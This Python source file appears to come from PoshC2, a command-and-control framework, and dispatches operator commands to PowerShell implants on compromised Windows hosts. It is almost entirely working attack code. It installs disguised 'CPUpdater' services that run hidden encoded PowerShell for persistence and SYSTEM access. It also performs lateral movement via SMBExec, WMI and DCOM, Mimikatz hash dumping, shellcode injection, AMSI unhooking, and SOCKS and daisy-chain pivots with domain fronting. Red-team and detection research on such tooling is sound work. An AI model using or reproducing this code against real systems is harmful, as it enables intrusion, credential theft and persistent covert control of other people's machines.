import base64, re, traceback, os
from poshc2.client.Alias import ps_alias
from poshc2.Colours import Colours
from poshc2.Utils import argp, load_file, gen_key
from poshc2.server.AutoLoads import check_module_loaded, run_autoloads
from poshc2.client.Help import posh_help
from poshc2.server.Config import PayloadsDirectory, PoshInstallDirectory, PoshProjectDirectory, SocksHost, ModulesDirectory, DatabaseType, DomainFrontHeader, PayloadCommsHost
from poshc2.server.Core import print_bad, creds, print_good
from poshc2.client.Opsec import ps_opsec
from poshc2.server.Payloads import Payloads
from prompt_toolkit import PromptSession
from prompt_toolkit.history import FileHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.styles import Style
from poshc2.client.cli.CommandPromptCompleter import FilePathCompleter


if DatabaseType.lower() == "postgres":
    from poshc2.server.database.DBPostgres import new_task, select_item, update_label, kill_implant, get_implantdetails, get_c2server_all
    from poshc2.server.database.DBPostgres import get_newimplanturl, get_allurls, get_sharpurls, new_urldetails
else:
    from poshc2.server.database.DBSQLite import new_task, select_item, update_label, kill_implant, get_implantdetails, get_c2server_all
    from poshc2.server.database.DBSQLite import get_newimplanturl, get_allurls, get_sharpurls, new_urldetails


def handle_ps_command(command, user, randomuri, implant_id):

    try:
        check_module_loaded("Stage2-Core.ps1", randomuri, user)
    except Exception as e:
        print_bad("Error loading Stage2-Core.ps1: %s" % e)

    # alias mapping
    for alias in ps_alias:
        if command.startswith(alias[0]):
            command.replace(alias[0], alias[1])

    command = command.strip()

    run_autoloads(command, randomuri, user)

    # opsec failures
    for opsec in ps_opsec:
        if opsec == command[:len(opsec)]:
            print_bad("**OPSEC Warning**")
            ri = input("Do you want to continue running - %s? (y/N) " % command)
            if ri.lower() == "n":
                command = ""
            if ri == "":
                command = ""
            break

    if command.startswith("unhook-amsi"):
        do_unhook_amsi(user, command, randomuri)
        return
    elif command.startswith("searchhelp"):
        do_searchhelp(user, command, randomuri)
        return
    elif command.startswith("download-files "):
        do_download_files(user, command, randomuri)
        return
    elif command.startswith("install-servicelevel-persistencewithproxy"):
        do_install_servicelevel_persistencewithproxy(user, command, randomuri)
        return
    elif command.startswith("install-servicelevel-persistence"):
        do_install_servicelevel_persistence(user, command, randomuri)
        return
    elif command.startswith("remove-servicelevel-persistence"):
        do_remove_servicelevel_persistence(user, command, randomuri)
        return
    elif command.startswith("get-implantworkingdirectory"):
        do_get_implantworkingdirectory(user, command, randomuri)
        return
    elif command.startswith("get-system-withproxy"):
        do_get_system_withproxy(user, command, randomuri)
        return
    elif command.startswith("get-system-withdaisy"):
        do_get_system_withdaisy(user, command, randomuri)
        return
    elif command.startswith("get-system"):
        do_get_system(user, command, randomuri)
        return
    elif command.startswith("invoke-psexec ") or command.startswith("invoke-smbexec "):
        do_invoke_psexec(user, command, randomuri)
        return
    elif command.startswith("invoke-psexecpayload "):
        do_invoke_psexecpayload(user, command, randomuri)
        return
    elif command.startswith("invoke-wmiexec "):
        do_invoke_wmiexec(user, command, randomuri)
        return
    elif command.startswith("invoke-wmijspbindpayload "):
        do_invoke_wmijspbindpayload(user, command, randomuri)
        return
    elif command.startswith("invoke-wmijspayload "):
        do_invoke_wmijspayload(user, command, randomuri)
        return
    elif command.startswith("invoke-wmipayload "):
        do_invoke_wmipayload(user, command, randomuri)
        return
    elif command.startswith("invoke-dcompayload "):
        do_invoke_dcompayload(user, command, randomuri)
        return
    elif command.startswith("invoke-runas "):
        do_invoke_runas(user, command, randomuri)
        return
    elif command.startswith("invoke-runaspayload"):
        do_invoke_runaspayload(user, command, randomuri)
        return
    elif command == "help":
        do_help(user, command, randomuri)
        return
    elif command.startswith("get-pid"):
        do_get_pid(user, command, randomuri)
        return
    elif command.startswith("upload-file"):
        do_upload_file(user, command, randomuri)
        return
    elif command == "kill-implant" or command == "exit":
        do_kill_implant(user, command, randomuri)
        return
    elif command.startswith("migrate"):
        do_migrate(user, command, randomuri)
        return
    elif command.startswith("loadmoduleforce"):
        do_loadmoudleforce(user, command, randomuri)
        return
    elif command.startswith("loadmodule"):
        do_loadmodule(user, command, randomuri)
        return
    elif command.startswith("pbind-loadmodule"):
        do_pbind_loadmodule(user, command, randomuri)
        return
    elif command.startswith("invoke-daisychain"):
        do_invoke_daisychain(user, command, randomuri)
        return
    elif command.startswith("inject-shellcode"):
        do_inject_shellcode(user, command, randomuri)
        return
    elif command == "listmodules":
        do_listmodules(user, command, randomuri)
        return
    elif command == "modulesloaded":
        do_modulesloaded(user, command, randomuri)
        return
    elif command == "ps":
        do_ps(user, command, randomuri)
        return
    elif command == "hashdump":
        do_hashdump(user, command, randomuri)
        return
    elif command == "stopdaisy":
        do_stopdaisy(user, command, randomuri)
        return
    elif command == "stopsocks":
        do_stopsocks(user, command, randomuri)
        return
    elif command == "sharpsocks":
        do_sharpsocks(user, command, randomuri)
        return
    elif command.startswith("reversedns"):
        do_reversedns(user, command, randomuri)
        return
    elif command.startswith("startdaisy"):
        do_startdaisy(user, command, randomuri)
        return
    elif command.startswith("sharp") or command.startswith("run-exe") or command.startswith("run-dll"):
        do_sharp(user, command, randomuri)
        return
    else:
        if command:
            do_shell(user, command, randomuri)
        return


def do_unhook_amsi(user, command, randomuri):
    new_task("unhook", user, randomuri)


def do_searchhelp(user, command, randomuri):
    searchterm = (command).replace("searchhelp ", "")
    helpful = posh_help.split('\n')
    for line in helpful:
        if searchterm in line.lower():
            print(Colours.GREEN + line)


def do_download_files(user, command, randomuri):
    print_bad("Please enter a full path to the directory")


def do_install_servicelevel_persistencewithproxy(user, command, randomuri):
    C2 = get_c2server_all()
    if C2.ProxyURL == "":
        print_bad("Need to run createproxypayload first")
        return
    else:
        newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent, C2.Referrer, "%s?p" % get_newimplanturl(), PayloadsDirectory)
        payload = newPayload.CreateRawBase()
        cmd = "sc.exe create CPUpdater binpath= 'cmd /c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s' Displayname= CheckpointServiceUpdater start= auto" % (payload)
        new_task(cmd, user, randomuri)


def do_install_servicelevel_persistence(user, command, randomuri):
    C2 = get_c2server_all()
    newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent, C2.Referrer, get_newimplanturl(), PayloadsDirectory)
    payload = newPayload.CreateRawBase()
    cmd = "sc.exe create CPUpdater binpath= 'cmd /c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s' Displayname= CheckpointServiceUpdater start= auto" % (payload)
    new_task(cmd, user, randomuri)


def do_remove_servicelevel_persistence(user, commmand, randomuri):
    new_task("sc.exe delete CPUpdater", user, randomuri)


def do_get_implantworkingdirectory(user, command, randomuri):
    new_task("pwd", user, randomuri)


def do_get_system_withproxy(user, command, randomuri):
    C2 = get_c2server_all()
    if C2.ProxyURL == "":
        print_bad("Need to run createproxypayload first")
        return
    else:
        newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent, C2.Referrer, "%s?p" % get_newimplanturl(), PayloadsDirectory)
        payload = newPayload.CreateRawBase()
        cmd = "sc.exe create CPUpdaterMisc binpath= 'cmd /c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s' Displayname= CheckpointServiceModule start= auto" % payload
        new_task(cmd, user, randomuri)
        cmd = "sc.exe start CPUpdaterMisc"
        new_task(cmd, user, randomuri)
        cmd = "sc.exe delete CPUpdaterMisc"
        new_task(cmd, user, randomuri)


def do_get_system_withdaisy(user, command, randomuri):
    daisyname = input("Payload name required: ")
    if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, daisyname))):
        with open("%s%spayload.bat" % (PayloadsDirectory, daisyname), "r") as p:
            payload = p.read()
        cmd = "sc.exe create CPUpdaterMisc binpath= 'cmd /c %s' Displayname= CheckpointServiceModule start= auto" % payload
        new_task(cmd, user, randomuri)
        cmd = "sc.exe start CPUpdaterMisc"
        new_task(cmd, user, randomuri)
        cmd = "sc.exe delete CPUpdaterMisc"
        new_task(cmd, user, randomuri)


def do_get_system(user, command, randomuri):
    C2 = get_c2server_all()
    newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent, C2.Referrer, get_newimplanturl(), PayloadsDirectory)
    payload = newPayload.CreateRawBase()
    cmd = "sc.exe create CPUpdaterMisc binpath= 'cmd /c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s' Displayname= CheckpointServiceModule start= auto" % payload
    new_task(cmd, user, randomuri)
    cmd = "sc.exe start CPUpdaterMisc"
    new_task(cmd, user, randomuri)
    cmd = "sc.exe delete CPUpdaterMisc"
    new_task(cmd, user, randomuri)


@creds()
def do_invoke_psexec(user, command, randomuri):
    check_module_loaded("Invoke-SMBExec.ps1", randomuri, user)
    params = re.compile("invoke-smbexec |invoke-psexec ", re.IGNORECASE)
    params = params.sub("", command)
    cmd = "invoke-smbexec %s" % params
    new_task(cmd, user, randomuri)


def do_invoke_smbexec(user, command, randomuri):
    return do_invoke_psexec(user, command, randomuri)


@creds()
def do_invoke_psexecpayload(user, command, randomuri):
    check_module_loaded("Invoke-PsExec.ps1", randomuri, user)

    style = Style.from_dict({
        '': '#80d130',
    })
    session = PromptSession(history=FileHistory('%s/.payload-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
    try:
        path = session.prompt("Payload to use: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.bat"))
        path = PayloadsDirectory + path
    except KeyboardInterrupt:
        return

    if os.path.isfile(path):
        with open(path, "r") as p:
            payload = p.read()
        params = re.compile("invoke-psexecpayload ", re.IGNORECASE)
        params = params.sub("", command)
        cmd = "invoke-psexec %s -command \"%s\"" % (params, payload)
        new_task(cmd, user, randomuri)
    else:
        print_bad("Need to run createproxypayload first")
        return


@creds()
def do_invoke_wmiexec(user, command, randomuri):
    check_module_loaded("Invoke-WMIExec.ps1", randomuri, user)
    params = re.compile("invoke-wmiexec ", re.IGNORECASE)
    params = params.sub("", command)
    cmd = "invoke-wmiexec %s" % params
    new_task(cmd, user, randomuri)


@creds()
def do_invoke_wmijspbindpayload(user, command, randomuri):
    check_module_loaded("New-JScriptShell.ps1", randomuri, user)
    with open("%s%sDotNet2JS_PBind.b64" % (PayloadsDirectory, ""), "r") as p:
        payload = p.read()
    params = re.compile("invoke-wmijspbindpayload ", re.IGNORECASE)
    params = params.sub("", command)
    new_task("$Shellcode64=\"%s\" #%s" % (payload, "%s%sDotNet2JS_PBind.b64" % (PayloadsDirectory, "")), user, randomuri)
    cmd = "new-jscriptshell %s -payload $Shellcode64" % (params)
    new_task(cmd, user, randomuri)
    target = re.search("(?<=-target )\\S*", str(cmd), re.IGNORECASE)
    C2 = get_c2server_all()
    print()
    print("To connect to the SMB named pipe use the following command:")
    print(Colours.GREEN + "invoke-pbind -target %s -secret mtkn4 -key %s -pname jaccdpqnvbrrxlaf -client" % (target[0], C2.EncKey) + Colours.END)
    print()
    print("To issue commands to the SMB named pipe use the following command:")
    print(Colours.GREEN + "pbind-command \"pwd\"" + Colours.END)
    print()
    print("To load modules to the SMB named pipe use the following command:")
    print(Colours.GREEN + "pbind-loadmodule Invoke-Mimikatz.ps1" + Colours.END)
    print()
    print("To kill the SMB named pipe use the following command:")
    print(Colours.GREEN + "pbind-kill" + Colours.END)


@creds()
def do_invoke_wmijspayload(user, command, randomuri):
    check_module_loaded("New-JScriptShell.ps1", randomuri, user)
    style = Style.from_dict({
        '': '#80d130',
    })
    session = PromptSession(history=FileHistory('%s/.payload-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
    try:
        path = session.prompt("Payload to use: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.b64"))
        path = PayloadsDirectory + path
    except KeyboardInterrupt:
        return

    if os.path.isfile(path):
        with open(path, "r") as p:
            payload = p.read()
        params = re.compile("invoke-wmijspayload ", re.IGNORECASE)
        params = params.sub("", command)
        new_task("$Shellcode64=\"%s\" #%s" % (payload, path), user, randomuri)
        cmd = "new-jscriptshell %s -payload $Shellcode64" % (params)
        new_task(cmd, user, randomuri)
    else:
        print_bad("Need to run createnewpayload first")
        return


@creds()
def do_invoke_wmipayload(user, command, randomuri):
    check_module_loaded("Invoke-WMIExec.ps1", randomuri, user)
    style = Style.from_dict({
        '': '#80d130',
    })
    session = PromptSession(history=FileHistory('%s/.payload-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
    try:
        path = session.prompt("Payload to use: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.bat"))
        path = PayloadsDirectory + path
    except KeyboardInterrupt:
        return

    if os.path.isfile(path):
        with open(path, "r") as p:
            payload = p.read()
        params = re.compile("invoke-wmipayload ", re.IGNORECASE)
        params = params.sub("", command)
        cmd = "invoke-wmiexec %s -command \"%s\"" % (params, payload)
        new_task(cmd, user, randomuri)
    else:
        print_bad("Need to run createdaisypayload first")
        return


def do_invoke_dcompayload(user, command, randomuri):
    style = Style.from_dict({
        '': '#80d130',
    })
    session = PromptSession(history=FileHistory('%s/.payload-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
    try:
        path = session.prompt("Payload to use: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.bat"))
        path = PayloadsDirectory + path
    except KeyboardInterrupt:
        return
    if os.path.isfile(path):
        with open(path, "r") as p:
            payload = p.read()
        p = re.compile(r'(?<=-target.).*')
        target = re.search(p, command).group()
        pscommand = "$c = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"%s\")); $c.Document.ActiveView.ExecuteShellCommand(\"C:\\Windows\\System32\\cmd.exe\",$null,\"/c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\",\"7\")" % (target, payload)
        new_task(pscommand, user, randomuri)
    else:
        print_bad("Need to run createnewpayload first")
        return


@creds(accept_hashes=False)
def do_invoke_runas(user, command, randomuri):
    check_module_loaded("Invoke-RunAs.ps1", randomuri, user)
    params = re.compile("invoke-runas ", re.IGNORECASE)
    params = params.sub("", command)
    cmd = "invoke-runas %s" % params
    new_task(cmd, user, randomuri)


@creds(accept_hashes=False)
def do_invoke_runaspayload(user, command, randomuri):
    style = Style.from_dict({
        '': '#80d130',
    })
    session = PromptSession(history=FileHistory('%s/.payload-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
    try:
        path = session.prompt("Payload to use: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.bat"))
        path = PayloadsDirectory + path
    except KeyboardInterrupt:
        return
    if os.path.isfile(path):
        with open(path, "r") as p:
            payload = p.read()
        new_task("$proxypayload = \"%s\"" % payload, user, randomuri)
        check_module_loaded("Invoke-RunAs.ps1", randomuri, user)
        check_module_loaded("NamedPipeDaisy.ps1", randomuri, user)
        params = re.compile("invoke-runasdaisypayload ", re.IGNORECASE)
        params = params.sub("", command)
        pipe = "add-Type -assembly System.Core; $pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMSDaisy'); $pi.Connect(); $pr = new-object System.IO.StreamReader($pi); iex $pr.ReadLine();"
        pscommand = "invoke-runas %s -command C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -Args \" -e %s\"" % (params, base64.b64encode(pipe.encode('UTF-16LE')).decode("utf-8"))
        new_task(pscommand, user, randomuri)
    else:
        print("Need to run createnewpayload first")
        return


def do_help(user, command, randomuri):
    print(posh_help)


def do_get_pid(user, command, randomuri):
    implant_details = get_implantdetails(randomuri)
    print(implant_details[8])


def do_upload_file(user, command, randomuri):
    source = ""
    destination = ""
    nothidden = False
    if command == "upload-file":
        style = Style.from_dict({
            '': '#80d130',
        })
        session = PromptSession(history=FileHistory('%s/.upload-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
        try:
            source = session.prompt("Location file to upload: ", completer=FilePathCompleter(PayloadsDirectory, glob="*"))
            source = PayloadsDirectory + source
        except KeyboardInterrupt:
            return
        while not os.path.isfile(source):
            print_bad("File does not exist: %s" % source)
            source = session.prompt("Location file to upload: ", completer=FilePathCompleter(PayloadsDirectory, glob="*"))
            source = PayloadsDirectory + source
        destination = session.prompt("Location to upload to: ")
    else:
        args = argp(command)
        source = args.source
        destination = args.destination
        nothidden = args.nothidden
    try:
        print("Uploading %s to %s" % (source, destination))
        if (nothidden):
            uploadcommand = f"upload-file {source} {destination} -NotHidden {nothidden}"
        else:
            uploadcommand = f"upload-file {source} {destination}"
        new_task(uploadcommand, user, randomuri)
    except Exception as e:
        print_bad("Error with source file: %s" % e)
        traceback.print_exc()


def do_kill_implant(user, command, randomuri):
    impid = get_implantdetails(randomuri)
    ri = input("Are you sure you want to terminate the implant ID %s? (Y/n) " % impid.ImplantID)
    if ri.lower() == "n":
        print("Implant not terminated")
    if ri == "":
        new_task("exit", user, randomuri)
        kill_implant(randomuri)
    if ri.lower() == "y":
        new_task("exit", user, randomuri)
        kill_implant(randomuri)


def do_exit(user, command, randomuri):
    return do_kill_implant(user, command, randomuri)


def do_migrate(user, command, randomuri):
    params = re.compile("migrate", re.IGNORECASE)
    params = params.sub("", command)
    implant = get_implantdetails(randomuri)
    implant_arch = implant[10]
    implant_comms = implant[15]
    if implant_arch == "AMD64":
        arch = "64"
    else:
        arch = "86"
    if implant_comms == "PS":
        path = "%spayloads/Posh_v4_x%s_Shellcode.bin" % (PoshProjectDirectory, arch)
        shellcodefile = load_file(path)
    elif "Daisy" in implant_comms:
        daisyname = input("Name required: ")
        path = "%spayloads/%sPosh_v4_x%s_Shellcode.bin" % (PoshProjectDirectory, daisyname, arch)
        shellcodefile = load_file(path)
    elif "Proxy" in implant_comms:
        path = "%spayloads/ProxyPosh_v4_x%s_Shellcode.bin" % (PoshProjectDirectory, arch)
        shellcodefile = load_file(path)
    check_module_loaded("Inject-Shellcode.ps1", randomuri, user)
    new_task("$Shellcode%s=\"%s\" #%s" % (arch, base64.b64encode(shellcodefile).decode("utf-8"), os.path.basename(path)), user, randomuri)
    new_task("Inject-Shellcode -Shellcode ([System.Convert]::FromBase64String($Shellcode%s))%s" % (arch, params), user, randomuri)


def do_loadmoudleforce(user, command, randomuri):
    params = re.compile("loadmoduleforce ", re.IGNORECASE)
    params = params.sub("", command)
    check_module_loaded(params, randomuri, user, force=True)


def do_loadmodule(user, command, randomuri):
    params = re.compile("loadmodule ", re.IGNORECASE)
    params = params.sub("", command)
    check_module_loaded(params, randomuri, user)


def do_pbind_loadmodule(user, command, randomuri):
    params = re.compile("pbind-loadmodule ", re.IGNORECASE)
    params = params.sub("", command)
    new_task(("pbind-loadmodule %s" % params), user, randomuri)


def do_invoke_daisychain(user, command, randomuri):
    check_module_loaded("Invoke-DaisyChain.ps1", randomuri, user)
    urls = get_allurls()
    new_task("%s -URLs '%s'" % (command, urls), user, randomuri)
    update_label("DaisyHost", randomuri)
    print("Now use createdaisypayload")


def do_inject_shellcode(user, command, randomuri):
    params = re.compile("inject-shellcode", re.IGNORECASE)
    params = params.sub("", command)
    check_module_loaded("Inject-Shellcode.ps1", randomuri, user)
    style = Style.from_dict({
        '': '#80d130',
    })
    session = PromptSession(history=FileHistory('%s/.shellcode-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
    try:
        path = session.prompt("Location of shellcode file: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.bin"))
        path = PayloadsDirectory + path
    except KeyboardInterrupt:
        return
    try:
        shellcodefile = load_file(path)
        if shellcodefile is not None:
            arch = "64"
            new_task("$Shellcode%s=\"%s\" #%s" % (arch, base64.b64encode(shellcodefile).decode("utf-8"), os.path.basename(path)), user, randomuri)
            new_task("Inject-Shellcode -Shellcode ([System.Convert]::FromBase64String($Shellcode%s))%s" % (arch, params), user, randomuri)
    except Exception as e:
        print_bad("Error loading file: %s" % e)


def do_listmodules(user, command, randomuri):
    modules = os.listdir(ModulesDirectory)
    modules = sorted(modules, key=lambda s: s.lower())
    print("")
    print("[+] Available modules:")
    print("")
    for mod in modules:
        if ".ps1" in mod:
            print(mod)


def do_modulesloaded(user, command, randomuri):
    ml = get_implantdetails(randomuri)
    print(ml[14])


def do_ps(user, command, randomuri):
    new_task("get-processlist", user, randomuri)


def do_hashdump(user, command, randomuri):
    check_module_loaded("Invoke-Mimikatz.ps1", randomuri, user)
    new_task("Invoke-Mimikatz -Command '\"lsadump::sam\"'", user, randomuri)


def do_stopdaisy(user, command, randomuri):
    update_label("", randomuri)
    new_task(command, user, randomuri)


def do_stopsocks(user, command, randomuri):
    update_label("", randomuri)
    new_task(command, user, randomuri)


def do_sharpsocks(user, command, randomuri):
    check_module_loaded("SharpSocks.ps1", randomuri, user)
    import string
    from random import choice
    allchar = string.ascii_letters
    channel = "".join(choice(allchar) for x in range(25))
    sharpkey = gen_key().decode("utf-8")
    sharpurls = get_sharpurls()
    sharpurl = select_item("PayloadCommsHost", "C2Server")
    dfheader = select_item("DomainFrontHeader", "C2Server")
    implant = get_implantdetails(randomuri)
    pivot = implant[15]
    if pivot != "PS":
        sharpurl = input("Enter the URL for SharpSocks: ")

    print(PoshInstallDirectory + "resources/SharpSocks/SharpSocksServerCore -c=%s -k=%s --verbose -l=%s\r\n" % (channel, sharpkey, SocksHost) + Colours.GREEN)
    ri = input("Are you ready to start the SharpSocks in the implant? (Y/n) ")
    if ri.lower() == "n":
        print("")
    if (ri == "") or (ri.lower() == "y"):
        taskcmd = "Sharpsocks -Client -Uri %s -Channel %s -Key %s -URLs %s -Insecure -Beacon 1000" % (sharpurl, channel, sharpkey, sharpurls)
        if dfheader:
            taskcmd += " -DomainFrontURL %s" % dfheader
        new_task(taskcmd, user, randomuri)
        update_label("SharpSocks", randomuri)


def do_reversedns(user, command, randomuri):
    params = re.compile("reversedns ", re.IGNORECASE)
    params = params.sub("", command)
    new_task("[System.Net.Dns]::GetHostEntry(\"%s\")" % params, user, randomuri)


def do_shell(user, command, randomuri):
    new_task(command, user, randomuri)


def do_startdaisy(user, command, randomuri):
    check_module_loaded("invoke-daisychain.ps1", randomuri, user)

    elevated = input(Colours.GREEN + "Are you elevated? Y/n " + Colours.END)

    domain_front = ""
    proxy_user = ""
    proxy_pass = ""
    proxy_url = ""
    cred_expiry = ""

    if elevated.lower() == "n":
        cont = input(Colours.RED + "Daisy from an unelevated context can only bind to localhost, continue? y/N " + Colours.END)
        if cont.lower() == "n" or cont == "":
            return

        bind_ip = "localhost"

    else:
        bind_ip = input(Colours.GREEN + "Bind IP on the daisy host: " + Colours.END)

    bind_port = input(Colours.GREEN + "Bind Port on the daisy host: " + Colours.END)
    firstdaisy = input(Colours.GREEN + "Is this the first daisy in the chain? Y/n? " + Colours.END)
    if firstdaisy.lower() == "y" or firstdaisy == "":
        upstream_url = input(Colours.GREEN + f"C2 URL (leave blank for {PayloadCommsHost}): " + Colours.END)
        if DomainFrontHeader:
            domain_front = input(Colours.GREEN + f"Domain front header (leave blank for {DomainFrontHeader}): " + Colours.END)
        else:
            domain_front = input(Colours.GREEN + f"Domain front header (leave blank for configured value of no header): " + Colours.END)
        proxy_user = input(Colours.GREEN + "Proxy user (<domain>\\<username>, leave blank if none): " + Colours.END)
        proxy_pass = input(Colours.GREEN + "Proxy password (leave blank if none): " + Colours.END)
        proxy_url = input(Colours.GREEN + "Proxy URL (leave blank if none): " + Colours.END)
        cred_expiry = input(Colours.GREEN + "Password/Account Expiration Date: .e.g. 15/03/2018: ")

        if not upstream_url:
            upstream_url = PayloadCommsHost
        if not domain_front:
            domain_front = DomainFrontHeader

    else:
        upstream_daisy_host = input(Colours.GREEN + "Upstream daisy server:  " + Colours.END)
        upstream_daisy_port = input(Colours.GREEN + "Upstream daisy port:  " + Colours.END)
        upstream_url = f"http://{upstream_daisy_host}:{upstream_daisy_port}"

    command = f"invoke-daisychain -daisyserver http://{bind_ip} -port {bind_port} -c2server {upstream_url}"

    if domain_front:
        command = command + f" -domfront {domain_front}"
    if proxy_user:
        command = command + f" -proxyurl {proxy_url}"
    if proxy_url:
        command = command + f" -proxyuser {proxy_user}"
    if proxy_pass:
        command = command + f" -proxypassword {proxy_pass}"

    if elevated.lower() == "y" or elevated == "":

        firewall = input(Colours.GREEN + "Add firewall rule? (uses netsh.exe) y/N: ")
        if firewall.lower() == "n" or firewall == "":
            command = command + " -nofwrule"

    else:
        print_good("Not elevated so binding to localhost and not adding firewall rule")
        command = command + " -localhost"

    urls = get_allurls()
    command = command + f" -urls '{urls}'"
    new_task(command, user, randomuri)
    update_label("DaisyHost", randomuri)

    createpayloads = input(Colours.GREEN + "Would you like to create payloads for this Daisy Server? Y/n ")

    if createpayloads.lower() == "y" or createpayloads == "":

        name = input(Colours.GREEN + "Enter a payload name: " + Colours.END)

        daisyhost = get_implantdetails(randomuri)
        proxynone = "if (!$proxyurl){$wc.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()}"
        C2 = get_c2server_all()
        urlId = new_urldetails(name, f"http://{bind_ip}:{bind_port}", C2.DomainFrontHeader, proxy_url, proxy_user, proxy_pass, cred_expiry)
        newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent, C2.Referrer, "%s?d" % get_newimplanturl(), PayloadsDirectory, URLID = urlId, PowerShellProxyCommand=proxynone)
        newPayload.PSDropper = (newPayload.PSDropper).replace("$pid;%s" % (upstream_url), "$pid;%s@%s" % (daisyhost.User, daisyhost.Domain))
        newPayload.CreateDroppers(name)
        newPayload.CreateRaw(name)
        newPayload.CreateDlls(name)
        newPayload.CreateShellcode(name)
        newPayload.CreateEXE(name)
        newPayload.CreateMsbuild(name)
        newPayload.CreateCS(name)
        print_good("Created new %s daisy payloads" % name)


def do_sharp(user, command, randomuri):
    check = input(Colours.RED + "\nDid you mean to run this sharp command in a PS implant? y/N ")
    if check.lower() == "y":
        new_task(command, user, randomuri)